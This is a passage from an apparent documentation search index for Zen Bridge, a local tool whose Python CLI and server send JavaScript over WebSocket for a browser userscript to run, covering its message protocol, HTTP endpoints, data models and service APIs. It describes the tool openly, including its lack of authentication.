parse_incoming_message,\n    ExecuteResult\n)\n\n# Create request\nrequest_id = str(uuid.uuid4())\nrequest = create_execute_request(\n    request_id=request_id,\n    code=\"document.title\"\n)\n\n# Serialize to JSON\nrequest_json = request.model_dump_json()\n\n# Send to browser via WebSocket...\n# Receive response...\n\n# Parse response\nresponse_data = {\n    \"type\": \"result\",\n    \"request_id\": request_id,\n    \"ok\": True,\n    \"result\": \"Example Domain\",\n    \"url\": \"https://example.com\",\n    \"title\": \"Example Domain\"\n}\n\nresult = parse_incoming_message(response_data)\n\n# Type-safe access\nif isinstance(result, ExecuteResult):\n    if result.ok:\n        print(f\"Success: {result.result}\")\n        print(f\"URL: {result.url}\")\n    else:\n        print(f\"Error: {result.error}\")\n</code></pre>"},{"location":"api/models/#configuration-loading","title":"Configuration Loading","text":"<pre><code>import json\nfrom pathlib import Path\nfrom zen.domain.models import ZenConfig\n\n# Load from file\nconfig_path = Path.home() / \".config\" / \"zen-bridge\" / \"config.json\"\nif config_path.exists():\n    with open(config_path) as f:\n        config_dict = json.load(f)\n    config = ZenConfig(**config_dict)\nelse:\n    # Use defaults\n    config = ZenConfig()\n\n# Access configuration\nprint(f\"AI Language: {config.ai_language}\")\nprint(f\"Auto Refocus: {config.control.auto_refocus}\")\nprint(f\"Speak Name: {config.control.speak_name}\")\n</code></pre>"},{"location":"api/models/#validation-error-handling","title":"Validation Error Handling","text":"<pre><code>from pydantic import ValidationError\nfrom zen.domain.models import ControlConfig\n\ntry:\n    config = ControlConfig(\n        click_delay=-1,  # Invalid: must be &gt;= 0\n        focus_size=0,    # Invalid: must be &gt;= 1\n    )\nexcept ValidationError as e:\n    print(e)\n    # Shows detailed validation errors\n</code></pre>"},{"location":"api/models/#see-also","title":"See Also","text":"<ul> <li>Commands Reference</li> <li>Services Reference</li> <li>Protocol Specification</li> <li>Configuration Guide</li> </ul>"},{"location":"api/protocol/","title":"WebSocket Protocol Specification","text":"<p>Complete specification for the Zen Bridge WebSocket protocol.</p>"},{"location":"api/protocol/#overview","title":"Overview","text":"<p>Zen Bridge uses a bidirectional WebSocket protocol for real-time communication between the Python server and browser userscript. The protocol supports:</p> <ul> <li>Code Execution: Execute JavaScript in browser from server</li> <li>Keepalive: Ping/pong for connection health</li> <li>Control Mode: Interactive keyboard navigation</li> <li>Notifications: Asynchronous events from browser</li> </ul> <p>Protocol Version: 1.0 WebSocket Path: <code>ws://127.0.0.1:8766</code> HTTP API: <code>http://127.0.0.1:8765</code></p>"},{"location":"api/protocol/#connection-lifecycle","title":"Connection Lifecycle","text":""},{"location":"api/protocol/#1-connection-establishment","title":"1. Connection Establishment","text":"<pre><code>sequenceDiagram\n    participant Browser\n    participant Server\n\n    Browser-&gt;&gt;Server: WebSocket Connect (ws://127.0.0.1:8766)\n    Server--&gt;&gt;Browser: Connection Accepted\n    Browser-&gt;&gt;Server: ping\n    Server--&gt;&gt;Browser: pong</code></pre> <p>Steps:</p> <ol> <li>Browser userscript connects to <code>ws://127.0.0.1:8766</code></li> <li>Server accepts WebSocket connection</li> <li>Browser sends periodic ping messages</li> <li>Server responds with pong messages</li> </ol>"},{"location":"api/protocol/#2-active-communication","title":"2. Active Communication","text":"<p>Once connected, both sides can send messages at any time:</p> <ul> <li>Server sends <code>execute</code> requests</li> <li>Browser sends <code>result</code> responses</li> <li>Browser sends <code>reinit_control</code> requests</li> <li>Browser sends <code>refocus_notification</code> events</li> <li>Browser sends <code>ping</code> keepalives</li> <li>Server sends <code>pong</code> responses</li> </ul>"},{"location":"api/protocol/#3-connection-termination","title":"3. Connection Termination","text":"<p>Connection closes when:</p> <ul> <li>Browser tab/window closes</li> <li>Server shuts down</li> <li>Connection error occurs</li> <li>Keepalive timeout (no ping for 30+ seconds)</li> </ul>"},{"location":"api/protocol/#message-types","title":"Message Types","text":""},{"location":"api/protocol/#direction-server-browser","title":"Direction: Server \u2192 Browser","text":""},{"location":"api/protocol/#execute","title":"execute","text":"<p>Execute JavaScript code in the browser.</p> <p>Format: <pre><code>{\n  \"type\": \"execute\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"code\": \"document.title\"\n}\n</code></pre></p> <p>Fields:</p> <ul> <li><code>type</code>: Always \"execute\"</li> <li><code>request_id</code>: UUID v4 for request tracking</li> <li><code>code</code>: JavaScript code to evaluate</li> </ul> <p>Response: Browser sends <code>result</code> message</p>"},{"location":"api/protocol/#pong","title":"pong","text":"<p>Keepalive response to ping.</p> <p>Format: <pre><code>{\n  \"type\": \"pong\"\n}\n</code></pre></p> <p>Fields:</p> <ul> <li><code>type</code>: Always \"pong\"</li> </ul> <p>Trigger: Sent in response to <code>ping</code> from browser</p>"},{"location":"api/protocol/#direction-browser-server","title":"Direction: Browser \u2192 Server","text":""},{"location":"api/protocol/#result","title":"result","text":"<p>Result of JavaScript code execution.</p> <p>Format (Success): <pre><code>{\n  \"type\": \"result\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"ok\": true,\n  \"result\": \"Example Domain\",\n  \"url\": \"https://example.com\",\n  \"title\": \"Example Domain\"\n}\n</code></pre></p> <p>Format (Error): <pre><code>{\n  \"type\": \"result\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"ok\": false,\n  \"error\": \"ReferenceError: foo is not defined\"\n}\n</code></pre></p> <p>Fields:</p> <ul> <li><code>type</code>: Always \"result\"</li> <li><code>request_id</code>: UUID matching the execute request</li> <li><code>ok</code>: true if execution succeeded, false otherwise</li> <li><code>result</code>: Return value (present if ok=true)</li> <li><code>error</code>: Error message (present if ok=false)</li> <li><code>url</code>: Current page URL (optional)</li> <li><code>title</code>: Current page title (optional)</li> </ul> <p>Additional Fields: Browser may include extra fields</p>"},{"location":"api/protocol/#reinit_control","title":"reinit_control","text":"<p>Request to reinitialize control mode after page reload.</p> <p>Format: <pre><code>{\n  \"type\": \"reinit_control\",\n  \"config\": {\n    \"auto-refocus\": \"only-spa\",\n    \"speak-name\": false,\n    \"verbose\": true\n  }\n}\n</code></pre></p> <p>Fields:</p> <ul> <li><code>type</code>: Always \"reinit_control\"</li> <li><code>config</code>: Control mode configuration object</li> </ul> <p>Purpose: Sent when browser detects page reload and needs control mode reinitialized</p>"},{"location":"api/protocol/#refocus_notification","title":"refocus_notification","text":"<p>Notification of refocus operation result.</p> <p>Format: <pre><code>{\n  \"type\": \"refocus_notification\",\n  \"success\": true,\n  \"message\": \"Refocused to first interactive element\"\n}\n</code></pre></p> <p>Fields:</p> <ul> <li><code>type</code>: Always \"refocus_notification\"</li> <li><code>success</code>: Whether refocus succeeded</li> <li><code>message</code>: Human-readable status message</li> </ul> <p>Purpose: Asynchronous notification of refocus events (not tied to a specific request)</p>"},{"location":"api/protocol/#ping","title":"ping","text":"<p>Keepalive message.</p> <p>Format: <pre><code>{\n  \"type\": \"ping\"\n}\n</code></pre></p> <p>Fields:</p> <ul> <li><code>type</code>: Always \"ping\"</li> </ul> <p>Response: Server sends <code>pong</code> message</p> <p>Frequency: Sent every 10 seconds by browser</p>"},{"location":"api/protocol/#requestresponse-patterns","title":"Request/Response Patterns","text":""},{"location":"api/protocol/#execute-pattern","title":"Execute Pattern","text":"<p>Standard synchronous request/response:</p> <pre><code>sequenceDiagram\n    participant CLI\n    participant Server\n    participant Browser\n\n    CLI-&gt;&gt;Server: HTTP POST /run {code}\n    Server-&gt;&gt;Server: Generate request_id\n    Server-&gt;&gt;Browser: execute {request_id, code}\n    Browser-&gt;&gt;Browser: Evaluate JavaScript\n    Browser-&gt;&gt;Server: result {request_id, ok, result/error}\n    Server-&gt;&gt;CLI: HTTP Response {ok, result}</code></pre> <p>Timeline:</p> <ol> <li>CLI makes HTTP request to server</li> <li>Server generates unique request_id</li> <li>Server sends execute message to browser via WebSocket</li> <li>Browser evaluates JavaScript code</li> <li>Browser sends result message back to server</li> <li>Server returns result to CLI via HTTP response</li> </ol> <p>Timeout: Configurable (default: 10 seconds)</p>"},{"location":"api/protocol/#notification-flow","title":"Notification Flow","text":"<p>Asynchronous notifications from browser:</p> <pre><code>sequenceDiagram\n    participant Browser\n    participant Server\n    participant CLI\n\n    Browser-&gt;&gt;Browser: Page navigates\n    Browser-&gt;&gt;Server: reinit_control {config}\n    Server-&gt;&gt;Browser: execute {control initialization}\n    Browser-&gt;&gt;Browser: Reinitialize control mode\n    Browser-&gt;&gt;Server: refocus_notification {success, message}\n    Server-&gt;&gt;CLI: Store notification\n    CLI-&gt;&gt;Server: HTTP GET /notifications\n    Server-&gt;&gt;CLI: Response {notifications}</code></pre> <p>Flow:</p> <ol> <li>Browser detects event (navigation, refocus, etc.)</li> <li>Browser sends notification to server</li> <li>Server stores notification</li> <li>CLI polls /notifications endpoint</li> <li>Server returns stored notifications</li> <li>Notifications cleared after retrieval</li> </ol>"},{"location":"api/protocol/#keepalive-pattern","title":"Keepalive Pattern","text":"<p>Connection health monitoring:</p> <pre><code>sequenceDiagram\n    participant Browser\n    participant Server\n\n    loop Every 10 seconds\n        Browser-&gt;&gt;Server: ping\n        Server-&gt;&gt;Browser: pong\n    end\n\n    Note over Browser,Server: If no ping for 30s, connection considered dead</code></pre> <p>Parameters:</p> <ul> <li>Ping interval: 10 seconds</li> <li>Timeout threshold: 30 seconds</li> <li>Action on timeout: Close connection</li> </ul>"},{"location":"api/protocol/#error-handling","title":"Error Handling","text":""},{"location":"api/protocol/#connection-errors","title":"Connection Errors","text":"<p>Error: WebSocket connection fails</p> <p>Behavior:</p> <ul> <li>Browser userscript logs error to console</li> <li>Server marks connection as closed</li> <li>CLI commands fail with \"Server not running\" error</li> </ul> <p>Recovery:</p> <ul> <li>Browser: Retry connection (exponential backoff)</li> <li>CLI: User must start server with <code>zen server start</code></li> </ul>"},{"location":"api/protocol/#execution-errors","title":"Execution Errors","text":"<p>Error: JavaScript execution throws exception</p> <p>Behavior:</p> <ul> <li>Browser catches exception</li> <li>Browser sends result with <code>ok: false</code> and <code>error</code> message</li> <li>Server returns error to CLI</li> <li>CLI exits with code 1</li> </ul> <p>Example:</p> <pre><code>{\n  \"type\": \"result\",\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\",\n  \"ok\": false,\n  \"error\": \"TypeError: Cannot read property 'foo' of undefined\"\n}\n</code></pre>"},{"location":"api/protocol/#timeout-errors","title":"Timeout Errors","text":"<p>Error: No response received within timeout</p> <p>Behavior:</p> <ul> <li>Server waits for configured timeout (default: 10s)</li> <li>If no response, server returns timeout error</li> <li>CLI can optionally retry with exponential backoff</li> </ul> <p>Mitigation:</p> <ul> <li>Increase timeout for slow operations</li> <li>Enable retry with <code>retry_on_timeout=True</code></li> </ul>"},{"location":"api/protocol/#version-mismatch","title":"Version Mismatch","text":"<p>Error: Userscript version doesn't match server version</p> <p>Behavior:</p> <ul> <li>Server checks version on first execute</li> <li>If mismatch, prints warning to CLI</li> <li>Execution continues (non-fatal)</li> </ul> <p>Resolution:</p> <ul> <li>Update userscript to match server version</li> <li>Or update server to match userscript version</li> </ul>"},{"location":"api/protocol/#version-negotiation","title":"Version Negotiation","text":"<p>Current Version: 1.0 (implicit)</p> <p>Future: Version field may be added to messages:</p> <pre><code>{\n  \"type\": \"execute\",\n  \"version\": \"2.0\",\n  \"request_id\": \"...\",\n  \"code\": \"...\"\n}\n</code></pre> <p>Compatibility:</p> <ul> <li>Current protocol has no explicit versioning</li> <li>Version mismatch detected via userscript metadata</li> <li>Non-breaking changes allowed in minor versions</li> <li>Breaking changes require major version bump</li> </ul>"},{"location":"api/protocol/#code-examples","title":"Code Examples","text":""},{"location":"api/protocol/#python-server-sending-execute-request","title":"Python Server (Sending Execute Request)","text":"<pre><code>import uuid\nimport json\nfrom zen.domain.models import create_execute_request\n\n# Create request\nrequest_id = str(uuid.uuid4())\nrequest = create_execute_request(\n    request_id=request_id,\n    code=\"document.title\"\n)\n\n# Serialize to JSON\nmessage = request.model_dump_json()\n\n# Send via WebSocket\nawait websocket.send(message)\n\n# Wait for response\nresponse_data = await websocket.recv()\nresponse_dict = json.loads(response_data)\n\n# Parse response\nfrom zen.domain.models import parse_incoming_message\nresult = parse_incoming_message(response_dict)\n\nif result.type == \"result\":\n    if result.ok:\n        print(f\"Success: {result.result}\")\n    else:\n        print(f\"Error: {result.error}\")\n</code></pre>"},{"location":"api/protocol/#javascript-browser-receiving-execute-request","title":"JavaScript Browser (Receiving Execute Request)","text":"<pre><code>// WebSocket connection\nconst ws = new WebSocket('ws://127.0.0.1:8766');\n\nws.onmessage = async (event) =&gt; {\n  const message = JSON.parse(event.data);\n\n  if (message.type === 'execute') {\n    try {\n      // Evaluate JavaScript code\n      const result = await eval(message.code);\n\n      // Send success response\n      ws.send(JSON.stringify({\n        type: 'result',\n        request_id: message.request_id,\n        ok: true,\n        result: result,\n        url: location.href,\n        title: document.title\n      }));\n\n    } catch (error) {\n      // Send error response\n      ws.send(JSON.stringify({\n        type: 'result',\n        request_id: message.request_id,\n        ok: false,\n        error: error.toString()\n      }));\n    }\n  }\n\n  else if (message.type === 'pong') {\n    // Keepalive acknowledged\n    console.log('Pong received');\n  }\n};\n\n// Send ping every 10 seconds\nsetInterval(() =&gt; {\n  ws.send(JSON.stringify({ type: 'ping' }));\n}, 10000);\n</code></pre>"},{"location":"api/protocol/#javascript-browser-sending-notification","title":"JavaScript Browser (Sending Notification)","text":"<pre><code>// Detect page navigation\nwindow.addEventListener('load', () =&gt; {\n  // Request control mode reinitialization\n  ws.send(JSON.stringify({\n    type: 'reinit_control',\n    config: {\n      'auto-refocus': 'only-spa',\n      'speak-name': false,\n      'verbose': true\n    }\n  }));\n});\n\n// Send refocus notification\nfunction notifyRefocus(success, message) {\n  ws.send(JSON.stringify({\n    type: 'refocus_notification',\n    success: success,\n    message: message\n  }));\n}\n</code></pre>"},{"location":"api/protocol/#http-api-integration","title":"HTTP API Integration","text":"<p>While WebSocket handles real-time communication, HTTP API provides REST interface:</p>"},{"location":"api/protocol/#post-run","title":"POST /run","text":"<p>Submit code for execution.</p> <p>Request: <pre><code>{\n  \"code\": \"document.title\"\n}\n</code></pre></p> <p>Response: <pre><code>{\n  \"ok\": true,\n  \"request_id\": \"550e8400-e29b-41d4-a716-446655440000\"\n}\n</code></pre></p>"},{"location":"api/protocol/#get-resultrequest_id","title":"GET /result?request_id= <p>Retrieve execution result.</p> <p>Response (Pending): <pre><code>{\n  \"ok\": false,\n  \"status\": \"pending\"\n}\n</code></pre></p> <p>Response (Complete): <pre><code>{\n  \"ok\": true,\n  \"result\": \"Example Domain\",\n  \"url\": \"https://example.com\",\n  \"title\": \"Example Domain\"\n}\n</code></pre></p>","text":""},{"location":"api/protocol/#get-health","title":"GET /health <p>Check server health.</p> <p>Response: <pre><code>{\n  \"ok\": true,\n  \"timestamp\": 1698765432.123,\n  \"connected_browsers\": 1,\n  \"pending\": 0,\n  \"completed\": 142\n}\n</code></pre></p>","text":""},{"location":"api/protocol/#get-notifications","title":"GET /notifications <p>Retrieve pending notifications.</p> <p>Response: <pre><code>{\n  \"ok\": true,\n  \"notifications\": [\n    {\n      \"type\": \"refocus\",\n      \"success\": true,\n      \"message\": \"Refocused to first interactive element\",\n      \"timestamp\": 1698765432.123\n    }\n  ]\n}\n</code></pre></p>","text":""},{"location":"api/protocol/#post-reinit-control","title":"POST /reinit-control <p>Request control mode reinitialization.</p> <p>Request: <pre><code>{\n  \"config\": {\n    \"auto-refocus\": \"always\",\n    \"speak-name\": true\n  }\n}\n</code></pre></p> <p>Response: <pre><code>{\n  \"ok\": true\n}\n</code></pre></p>","text":""},{"location":"api/protocol/#security-considerations","title":"Security Considerations","text":""},{"location":"api/protocol/#origin-validation","title":"Origin Validation <p>Current: No origin validation (localhost only)</p> <p>Future: Add CORS headers, origin whitelist</p>","text":""},{"location":"api/protocol/#authentication","title":"Authentication <p>Current: No authentication (local use only)</p> <p>Future: Token-based auth for remote access</p>","text":""},{"location":"api/protocol/#code-injection","title":"Code Injection <p>Risk: Arbitrary JavaScript execution</p> <p>Mitigation:</p> <ul> <li>Protocol designed for trusted local use</li> <li>User controls what code is executed</li> <li>Userscript runs in browser sandbox</li> </ul>","text":""},{"location":"api/protocol/#rate-limiting","title":"Rate Limiting <p>Current: No rate limiting</p> <p>Future: Request throttling, queue limits</p>","text":""},{"location":"api/protocol/#performance-characteristics","title":"Performance Characteristics","text":""},{"location":"api/protocol/#latency","title":"Latency <ul> <li>Local WebSocket: &lt;5ms round-trip</li> <li>Execute request: 5-50ms depending on code complexity</li> <li>HTTP polling: 10-100ms</li> </ul>","text":""},{"location":"api/protocol/#throughput","title":"Throughput <ul> <li>Max concurrent requests: Unlimited (queued)</li> <li>Max message size: 1MB (configurable)</li> <li>Keepalive overhead: 12 bytes every 10 seconds</li> </ul>","text":""},{"location":"api/protocol/#scalability","title":"Scalability <ul> <li>Connections per server: 1 (single browser)</li> <li>Requests per second: Hundreds (limited by JavaScript execution)</li> <li>Queue depth: Unlimited (memory-bound)</li> </ul>","text":""},{"location":"api/protocol/#debugging","title":"Debugging","text":""},{"location":"api/protocol/#enable-verbose-logging","title":"Enable Verbose Logging <p>Server side: <pre><code>import logging\nlogging.basicConfig(level=logging.DEBUG)\n</code></pre></p> <p>Browser side: <pre><code>// Set verbose-logging: true in config.json\n</code></pre></p>","text":""},{"location":"api/protocol/#monitor-websocket-traffic","title":"Monitor WebSocket Traffic <p>Browser DevTools \u2192 Network \u2192 WS \u2192 Messages tab</p>","text":""},{"location":"api/protocol/#inspect-protocol-messages","title":"Inspect Protocol Messages <pre><code># In server code\nimport json\nprint(f\"Sending: {json.dumps(message, indent=2)}\")\nprint(f\"Received: {json.dumps(response, indent=2)}\")\n</code></pre>","text":""},{"location":"api/protocol/#see-also","title":"See Also","text":"<ul> <li>Commands Reference</li> <li>Services Reference</li> <li>Models Reference</li> <li>Architecture Guide</li> <li>WebSocket RFC</li> </ul>"},{"location":"api/services/","title":"Services API Reference","text":"<p>Complete reference for all four Zen Bridge services that provide business logic and orchestration.</p>"},{"location":"api/services/#overview","title":"Overview","text":"<p>Zen Bridge services layer implements the core business logic following a clean architecture pattern. Services use dependency injection, follow the single responsibility principle, and provide both synchronous and asynchronous interfaces where appropriate.</p> <p>Available Services:</p> <ul> <li>BridgeExecutor - Standardized command execution with retry logic</li> <li>AIIntegrationService - Language detection and AI tool orchestration</li> <li>ControlManager - Control mode state and notification management</li> <li>ScriptLoader - JavaScript script loading and caching</li> </ul>"},{"location":"api/services/#bridgeexecutor","title":"BridgeExecutor","text":"<p>Wraps the BridgeClient to provide standardized execution flow for browser commands.</p> <p>Location: <code>zen/services/bridge_executor.py</code></p>"},{"location":"api/services/#purpose","title":"Purpose","text":"<ul> <li>Consistent error handling across all CLI commands</li> <li>Retry logic with exponential backoff</li> <li>Result formatting and validation</li> <li>Version checking</li> <li>Connection pooling (future enhancement)</li> </ul>"},{"location":"api/services/#class-bridgeexecutor","title":"Class: <code>BridgeExecutor</code>","text":"<pre><code>class BridgeExecutor:\n    def __init__(\n        self,\n        host: str = \"127.0.0.1\",\n        port: int = 8765,\n        max_retries: int = 3,\n        retry_delay: float = 0.5,\n    ):\n        \"\"\"Initialize the bridge executor.\"\"\"\n</code></pre> <p>Parameters:</p> <ul> <li><code>host</code> (str): Bridge server host (default: localhost)</li> <li><code>port</code> (int): Bridge server port (default: 8765)</li> <li><code>max_retries</code> (int): Maximum number of retry attempts on transient failures</li> <li><code>retry_delay</code> (float): Initial delay between retries in seconds (exponential backoff)</li> </ul>"},{"location":"api/services/#methods","title":"Methods","text":""},{"location":"api/services/#is_server_running","title":"<code>is_server_running()</code>","text":"<p>Check if bridge server is running.</p> <p>Signature: <pre><code>def is_server_running(self) -&gt; bool\n</code></pre></p> <p>Returns:</p> <ul> <li><code>bool</code>: True if server is alive, False otherwise</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nif executor.is_server_running():\n    print(\"Server is running\")\n</code></pre>"},{"location":"api/services/#ensure_server_running","title":"<code>ensure_server_running()</code>","text":"<p>Ensure bridge server is running, exit with error if not.</p> <p>Signature: <pre><code>def ensure_server_running(self) -&gt; None\n</code></pre></p> <p>Exits:</p> <ul> <li><code>sys.exit(1)</code> if server is not running</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nexecutor.ensure_server_running()  # Will exit if server not running\n</code></pre>"},{"location":"api/services/#execute","title":"<code>execute()</code>","text":"<p>Execute JavaScript code in browser with error handling and optional retries.</p> <p>Signature: <pre><code>def execute(\n    self,\n    code: str,\n    timeout: float = 10.0,\n    retry_on_timeout: bool = False,\n) -&gt; dict[str, Any]\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>code</code> (str): JavaScript code to execute</li> <li><code>timeout</code> (float): Maximum time to wait for result in seconds</li> <li><code>retry_on_timeout</code> (bool): If True, retry on TimeoutError</li> </ul> <p>Returns:</p> <p>Dictionary with execution result:</p> <pre><code>{\n    \"ok\": bool,            # True if execution succeeded\n    \"result\": Any,         # Present if ok=True\n    \"error\": str,          # Present if ok=False\n    \"url\": str,            # Present for some commands\n    \"title\": str,          # Present for some commands\n}\n</code></pre> <p>Raises:</p> <ul> <li><code>SystemExit</code>: If execution fails after retries</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nresult = executor.execute(\n    \"document.title\",\n    timeout=5.0,\n    retry_on_timeout=True\n)\nprint(result[\"result\"])  # \"Example Domain\"\n</code></pre>"},{"location":"api/services/#execute_file","title":"<code>execute_file()</code>","text":"<p>Execute JavaScript from a file.</p> <p>Signature: <pre><code>def execute_file(\n    self,\n    filepath: str | Path,\n    timeout: float = 10.0,\n    retry_on_timeout: bool = False,\n) -&gt; dict[str, Any]\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>filepath</code> (str | Path): Path to JavaScript file</li> <li><code>timeout</code> (float): Maximum time to wait for result in seconds</li> <li><code>retry_on_timeout</code> (bool): If True, retry on TimeoutError</li> </ul> <p>Returns:</p> <ul> <li><code>dict[str, Any]</code>: Dictionary with execution result</li> </ul> <p>Raises:</p> <ul> <li><code>SystemExit</code>: If file read or execution fails</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nresult = executor.execute_file(\"script.js\", timeout=30.0)\n</code></pre>"},{"location":"api/services/#execute_with_script","title":"<code>execute_with_script()</code>","text":"<p>Execute a helper script with template substitutions.</p> <p>Signature: <pre><code>def execute_with_script(\n    self,\n    script_name: str,\n    substitutions: dict[str, str] | None = None,\n    timeout: float = 10.0,\n    retry_on_timeout: bool = False,\n) -&gt; dict[str, Any]\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script file in zen/scripts/</li> <li><code>substitutions</code> (dict[str, str] | None): Dictionary of placeholder \u2192 value substitutions</li> <li><code>timeout</code> (float): Maximum time to wait for result in seconds</li> <li><code>retry_on_timeout</code> (bool): If True, retry on TimeoutError</li> </ul> <p>Returns:</p> <ul> <li><code>dict[str, Any]</code>: Dictionary with execution result</li> </ul> <p>Raises:</p> <ul> <li><code>SystemExit</code>: If script not found or execution fails</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nresult = executor.execute_with_script(\n    \"cookies.js\",\n    substitutions={\n        \"ACTION_PLACEHOLDER\": \"get\",\n        \"NAME_PLACEHOLDER\": \"session_id\"\n    }\n)\n</code></pre>"},{"location":"api/services/#check_result_ok","title":"<code>check_result_ok()</code>","text":"<p>Check if result is successful, exit with error if not.</p> <p>Signature: <pre><code>def check_result_ok(self, result: dict[str, Any]) -&gt; None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>result</code> (dict[str, Any]): Execution result dictionary</li> </ul> <p>Exits:</p> <ul> <li><code>sys.exit(1)</code> if result[\"ok\"] is False</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nresult = executor.execute(\"document.title\")\nexecutor.check_result_ok(result)  # Will exit if result not ok\n</code></pre>"},{"location":"api/services/#get_status","title":"<code>get_status()</code>","text":"<p>Get bridge server status.</p> <p>Signature: <pre><code>def get_status(self) -&gt; dict[str, Any] | None\n</code></pre></p> <p>Returns:</p> <ul> <li><code>dict[str, Any] | None</code>: Status dictionary or None if server not running</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nstatus = executor.get_status()\nif status:\n    print(f\"Pending: {status['pending']}\")\n    print(f\"Completed: {status['completed']}\")\n</code></pre>"},{"location":"api/services/#check_userscript_version","title":"<code>check_userscript_version()</code>","text":"<p>Check if userscript version matches expected version.</p> <p>Signature: <pre><code>def check_userscript_version(self, show_warning: bool = True) -&gt; str | None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>show_warning</code> (bool): If True, print warning when versions don't match</li> </ul> <p>Returns:</p> <ul> <li><code>str | None</code>: Warning message if versions don't match, None otherwise</li> </ul> <p>Example:</p> <pre><code>executor = BridgeExecutor()\nwarning = executor.check_userscript_version()\nif warning:\n    print(warning)\n</code></pre>"},{"location":"api/services/#global-functions","title":"Global Functions","text":""},{"location":"api/services/#get_executor","title":"<code>get_executor()</code>","text":"<p>Get the default executor instance (singleton pattern).</p> <p>Signature: <pre><code>def get_executor(\n    host: str = \"127.0.0.1\",\n    port: int = 8765,\n    max_retries: int = 3,\n) -&gt; BridgeExecutor\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>host</code> (str): Bridge server host</li> <li><code>port</code> (int): Bridge server port</li> <li><code>max_retries</code> (int): Maximum retry attempts</li> </ul> <p>Returns:</p> <ul> <li><code>BridgeExecutor</code>: Shared BridgeExecutor instance</li> </ul> <p>Example:</p> <pre><code>from zen.services.bridge_executor import get_executor\n\nexecutor = get_executor()\nresult = executor.execute(\"document.title\")\n</code></pre>"},{"location":"api/services/#aiintegrationservice","title":"AIIntegrationService","text":"<p>Handles language detection and AI tool orchestration for content analysis commands.</p> <p>Location: <code>zen/services/ai_integration.py</code></p>"},{"location":"api/services/#purpose_1","title":"Purpose","text":"<ul> <li>Language detection from page content and configuration</li> <li>Prompt file loading and formatting</li> <li>Integration with external AI tools (mods, etc.)</li> <li>Debug mode for prompt inspection</li> </ul>"},{"location":"api/services/#class-aiintegrationservice","title":"Class: <code>AIIntegrationService</code>","text":"<pre><code>class AIIntegrationService:\n    def __init__(self, prompts_dir: Path | None = None):\n        \"\"\"Initialize the AI integration service.\"\"\"\n</code></pre> <p>Parameters:</p> <ul> <li><code>prompts_dir</code> (Path | None): Directory containing prompt files (default: project_root/prompts/)</li> </ul>"},{"location":"api/services/#methods_1","title":"Methods","text":""},{"location":"api/services/#get_target_language","title":"<code>get_target_language()</code>","text":"<p>Determine the language for AI operations.</p> <p>Signature: <pre><code>def get_target_language(\n    self,\n    language_override: str | None = None,\n    page_lang: str | None = None,\n) -&gt; str | None\n</code></pre></p> <p>Priority Order:</p> <ol> <li><code>language_override</code> (from --language flag)</li> <li>config.json ai-language setting</li> <li>If \"auto\", detect from page_lang</li> <li>Default to None (let AI decide)</li> </ol> <p>Parameters:</p> <ul> <li><code>language_override</code> (str | None): Language code from CLI flag (e.g., \"en\", \"nl\", \"fr\")</li> <li><code>page_lang</code> (str | None): Detected page language</li> </ul> <p>Returns:</p> <ul> <li><code>str | None</code>: Language code or None to let AI decide</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nlang = service.get_target_language(\n    language_override=\"en\",\n    page_lang=\"nl\"\n)\n# Returns: \"en\" (override takes priority)\n</code></pre>"},{"location":"api/services/#extract_page_language","title":"<code>extract_page_language()</code>","text":"<p>Extract page language from content string.</p> <p>Signature: <pre><code>def extract_page_language(self, content: str) -&gt; str | None\n</code></pre></p> <p>Looks for patterns like: - \"Language: xx\" - \"lang\": \"xx\"</p> <p>Parameters:</p> <ul> <li><code>content</code> (str): Content string (markdown or JSON)</li> </ul> <p>Returns:</p> <ul> <li><code>str | None</code>: Language code or None if not found</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\ncontent = \"**Language:** en\\n\\nPage content...\"\nlang = service.extract_page_language(content)\n# Returns: \"en\"\n</code></pre>"},{"location":"api/services/#check_mods_available","title":"<code>check_mods_available()</code>","text":"<p>Check if the 'mods' AI tool is available.</p> <p>Signature: <pre><code>def check_mods_available(self) -&gt; bool\n</code></pre></p> <p>Returns:</p> <ul> <li><code>bool</code>: True if mods is installed and accessible</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nif not service.check_mods_available():\n    print(\"Please install mods\")\n</code></pre>"},{"location":"api/services/#ensure_mods_available","title":"<code>ensure_mods_available()</code>","text":"<p>Ensure mods is available, exit with error if not.</p> <p>Signature: <pre><code>def ensure_mods_available(self) -&gt; None\n</code></pre></p> <p>Exits:</p> <ul> <li><code>sys.exit(1)</code> if mods is not installed</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nservice.ensure_mods_available()  # Will exit if mods not found\n</code></pre>"},{"location":"api/services/#load_prompt","title":"<code>load_prompt()</code>","text":"<p>Load a prompt file from the prompts directory.</p> <p>Signature: <pre><code>def load_prompt(self, prompt_name: str) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>prompt_name</code> (str): Name of prompt file (e.g., \"describe.prompt\", \"summary.prompt\")</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Prompt content as string</li> </ul> <p>Raises:</p> <ul> <li><code>SystemExit</code>: If prompt file not found</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nprompt = service.load_prompt(\"describe.prompt\")\n</code></pre>"},{"location":"api/services/#format_prompt","title":"<code>format_prompt()</code>","text":"<p>Format a complete prompt with language instructions and content.</p> <p>Signature: <pre><code>def format_prompt(\n    self,\n    base_prompt: str,\n    content: str,\n    target_lang: str | None = None,\n    